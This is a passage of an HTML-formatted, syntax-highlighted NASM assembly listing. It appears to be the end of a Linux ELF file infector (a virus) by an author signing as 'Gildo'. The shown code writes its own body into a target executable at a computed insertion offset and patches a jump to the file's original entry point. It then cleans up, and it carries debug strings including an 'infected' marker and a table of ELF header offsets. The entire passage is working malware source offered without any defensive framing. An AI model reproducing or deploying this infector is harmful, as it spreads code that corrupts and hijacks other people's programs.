    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;SYS lseek</span><span class="sc0">
    </span><span class="sc1">;write after insertion (assume ebx=fd)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;insertion_offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;total file length</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;remaining length to write</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;mapped</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">  </span><span class="sc1">;;write at end after insertion_offset</span><span class="sc0">
    
</span><span class="sc1">;fix jmp to old entry point (instead of exit) and jmp offsets</span><span class="sc0">
    </span><span class="sc1">;seek the fd at insertion_offset+0xb7, </span><span class="sc0">
    </span><span class="sc1">;where I'll put a jump to old entry point</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;insertion_offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0xb7</span><span class="sc0">  </span><span class="sc1">;it is the *jmp ahah* eheh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;SEEK_SET</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;SYS lseek</span><span class="sc0">
   </span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">string20</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">printf</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc9">%endif</span><span class="sc0">
    </span><span class="sc1">;write the address to jmp  (assume ebx=fd)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0x08048004</span><span class="sc0">  </span><span class="sc1">;address where instruction finish</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;old_entry</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;the opaddress part</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">   </span><span class="sc1">;SYS write</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;end fix</span><span class="sc0">
</span><span class="sc1">;end write</span><span class="sc0">

</span><span class="sc5">suit_error</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">munmap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">91</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ptr to map</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;map length</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc1">;;close the file</span><span class="sc0">
</span><span class="sc5">mmap_error</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">STACK2</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;fd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">      </span><span class="sc1">;close</span><span class="sc0">

</span><span class="sc1">;;exit</span><span class="sc0">
</span><span class="sc5">open_error</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">STACK2</span><span class="sc0">  </span><span class="sc1">;restore the stack allocated at the beginning</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;end main;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">



</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;data in section text;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">string1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'fd=%d'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">string2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'at offset 0x%X there is: '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'file size=%dbytes'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'mmap ptr=0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ecx=%d'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ebp = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string9</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'filesz = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string10</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'free space for insertion = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string11</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'offset = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string12</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'signatureELF = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string13</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'p_memsz = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string14</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'--------------------'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string15</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'sh_offset = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string16</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'sh_size = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string17</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'entry = 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">string20</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'seekKKKk to 0x%X'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">infected</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'infected'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">off_table</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;table with the file offsets where I want to look </span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc0"> </span><span class="sc1">;entry point (e_entry)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x1c</span><span class="sc0"> </span><span class="sc1">;program header offset (e_phoff)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc0"> </span><span class="sc1">;section header offset (e_shoff)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x2c</span><span class="sc0"> </span><span class="sc1">;number of phs (e_phnum) (only 2 bytes!!!)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc0"> </span><span class="sc1">;number of shs (e_shnum) (only 2 bytes!!!)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;end of table</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">
    </span><span class="sc1">;I let some words </span><span class="sc0">
</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'hello, nice boys, I hope you will enjoy this program written with nasm.I want to say thanks to all my programmers friend.Bye from Gildo.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span></div></body>
</html>
